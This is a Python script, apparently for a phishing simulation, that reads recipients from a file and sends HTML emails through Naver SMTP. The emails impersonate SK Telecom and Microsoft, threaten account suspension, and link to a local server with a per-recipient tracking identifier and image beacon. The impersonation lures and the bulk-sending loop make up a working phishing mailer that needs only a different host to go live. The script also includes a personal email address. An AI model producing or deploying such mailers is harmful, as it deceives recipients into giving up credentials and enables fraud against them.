#!usr/bin/python3
# _*_ coding-utf-8 _*_

import smtplib, time, hashlib, binascii, base64, getpass

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

#이메일 계정 입력
User = "a2256014@naver.com"
Pwd = getpass.getpass("비밀번호 입력 : ")

#메일 발송 시 보여질 이름
FROM1 = "<a2256014@naver.com>"
FROM2 = "=?UTF-8?B?6rmA64+E6reg?= <a2256014@naver.com>"

me = "a2256014@naver.com"

f = open("mailList.txt", 'r')

while True:
    line = f.readline()
    if not line:
        break

    #SMTP 연결 과정
    server = smtplib.SMTP("smtp.naver.com", 587)
    server.ehlo()
    server.starttls()
    server.ehlo()
    server.login(User, Pwd)

    #메일 수신자 리스트를 불러와 메일 발송 준비
    you = line
    msg = MIMEMultipart('alternative')
    msg['Subject'] = "mail 테스트 입니다."
    msg['From'] = FROM2
    msg['TO'] = you

    #메일 내 링크 클릭 시 사용자 식별 값 변조가 어렵도록 base64 인코딩 처리
    base64_you = base64.b64encode(you.encode('utf-8'))
    base64_decode_you = base64_you.decode()
    print("발송자 : " + me)
    print("발송 대상 : " + you)

    #메일 내용 구성
    html = """SK텔레콤에서 안내드립니다. <br><br>
            고객님의 Tworld 계정의 비밀번호를 변경하지 않으시면 3일 내로 휴먼 계정으로 전환될 예정입니다. <br><br>
            아래 링크를 클릭하여 비밀번호를 변경해주세요. <br><br>
            <div style="position:relative; text-align:left; width:70%;">
            <a href="http://127.0.0.1:3000?frame=""" + base64_decode_you + """">
            <img src = "http://127.0.0.1:3000/image?frame=""" + base64_decode_you + """" width="550" height="770"> </a>
            </div>
        """

    html2 ="""<img src="http://127.0.0.1:3000/image?frame="""+ base64_decode_you +"""" width="300" >
            <div>
                <h2>Dear user,</h2>
                <div style="font-size: 17px;">
                your account is out of limits and needs to be verified for your safety<br>
                Not verified within 24 hours? We will suspend your email account.<br>
                Take a moment to update your account without losing your email account.
                </div>
                ---------<br>
                <div style="font-size: 20px;">To update and secure your email account,&nbsp;&nbsp;&nbsp;<a href="http://127.0.0.1:3000?frame="""+ base64_decode_you +"""">click here.</a></div><br>
                <div style="font-size: 14px;">microsoft Corporation.</div>
            </div>
    """

    #발송
    part2 = MIMEText(html2, "html")
    msg.attach(part2)
    server.sendmail(me, you, msg.as_string())

    time.sleep(3)

    server.quit()

f.close()
